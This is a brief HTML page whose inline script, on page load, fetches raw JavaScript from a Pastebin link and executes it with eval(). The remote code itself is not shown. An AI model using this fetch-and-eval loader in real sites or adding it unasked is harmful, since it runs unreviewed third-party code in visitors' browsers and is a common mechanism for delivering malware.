<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Run Pastebin Script</title>
</head>
<body>
    <h1>Running JavaScript from Pastebin</h1>

    <script>
        // Fetch the JavaScript code from the Pastebin link and execute it
        fetch('https://pastebin.com/raw/RGQmxSBv')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.text();
            })
            .then(code => {
                // Execute the fetched JavaScript code
                eval(code);
            })
            .catch(error => console.error('Error fetching or executing script:', error));
    </script>
</body>
</html>
